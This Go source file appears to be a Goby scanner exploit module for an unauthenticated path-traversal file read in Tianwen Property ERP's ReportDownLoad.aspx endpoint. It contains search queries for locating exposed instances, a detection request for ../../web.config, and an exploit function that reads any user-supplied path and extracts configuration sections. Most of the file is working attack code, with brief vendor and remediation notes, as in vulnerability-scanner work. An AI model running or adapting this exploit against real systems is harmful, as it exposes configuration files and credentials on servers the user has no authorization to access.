package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Tianwen Property ERP /HM/M_Main/Club/ReportDownLoad.aspx File Read Vulnerability",
    "Description": "<p>Tianwen Property ERP system is an integrated property management platform.</p><p>Tianwen property ERP system /HM\\M_Main\\Club\\ReportDownLoad.aspx outlet has read arbitrary files loopholes, unauthenticated attacker can be read using this vulnerability within the system configuration files, cause information leakage.</p>",
    "Product": "Tianwen-property-ERP",
    "Homepage": "http://www.tw369.com/",
    "DisclosureDate": "2024-08-30",
    "PostTime": "2024-09-09",
    "Author": "3013320359@qq.com",
    "FofaQuery": "(body=\"WebOffice.rar\" || body=\"Jscript-Ui\") && (body=\"天问物业ERP系统\" || body=\"国家版权局软著登字第1205328号\" || body=\"/HM/M_Main/frame/sso.aspx\")",
    "GobyQuery": "(body=\"WebOffice.rar\" || body=\"Jscript-Ui\") && (body=\"天问物业ERP系统\" || body=\"国家版权局软著登字第1205328号\" || body=\"/HM/M_Main/frame/sso.aspx\")",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.tw369.com\">http://www.tw369.com</a> </p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p> 3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.config,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/HM/M_Main/Club/ReportDownLoad.aspx?AdjunctFile=../../web.config",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<configuration>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "userName=\"administrator\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<add key=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/HM\\M_Main\\Club\\ReportDownLoad.aspx?AdjunctFile=../../web.config",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "system.web",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "configuration",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "天问物业ERP系统 /HM/M_Main/Club/ReportDownLoad.aspx 文件读取漏洞",
            "Product": "天问物业ERP系统",
            "Description": "<p>天问物业ERP系统是一个集成化的物业管理平台。</p><p>天问物业ERP系统的 /HM\\M_Main\\Club\\ReportDownLoad.aspx接口处存在任意文件读取漏洞。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.tw369.com\">http://www.tw369.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>&nbsp;3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Tianwen Property ERP /HM/M_Main/Club/ReportDownLoad.aspx File Read Vulnerability",
            "Product": "Tianwen-property-ERP",
            "Description": "<p>Tianwen Property ERP system is an integrated property management platform.</p><p>Tianwen property ERP system /HM\\M_Main\\Club\\ReportDownLoad.aspx outlet has read arbitrary files loopholes, unauthenticated attacker can be read using this vulnerability within the system configuration files, cause information leakage.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"http://www.tw369.com\">http://www.tw369.com</a>&nbsp;</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`

	postOrGet_xEFHYqajU3 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/HM/M_Main/Club/ReportDownLoad.aspx?AdjunctFile=" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/HM/M_Main/Club/ReportDownLoad.aspx"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../../web.config": "system.web",
			}
			// 函数继承
			uploadFileFunc := postOrGet_xEFHYqajU3

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.config": {"../../web.config", "system.web"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_xEFHYqajU3

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
     	// 获取返回结果url和返回请求头
			
     	
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}
     resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			} 
     	if mode == "web.config" {
				re, _ := regexp.Compile(`<system.web>((.|\n)*?)</system.web>`)
				//检查是否有匹配到内容
     fmt.Println(resp)
				if !re.MatchString(resp) {
					//正则匹配不到输出全部文件内容
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				match := re.FindStringSubmatch(resp)
				
				tmpresp := "Key information extraction:\r\nwebconfig: " + match[1]
				resp = tmpresp + "\r\n\r\nAll file contents:\r\n" + resp
      	
      }
		 expResult.Success = true
			   expResult.Output = resp
			   return expResult
		},
	))
}
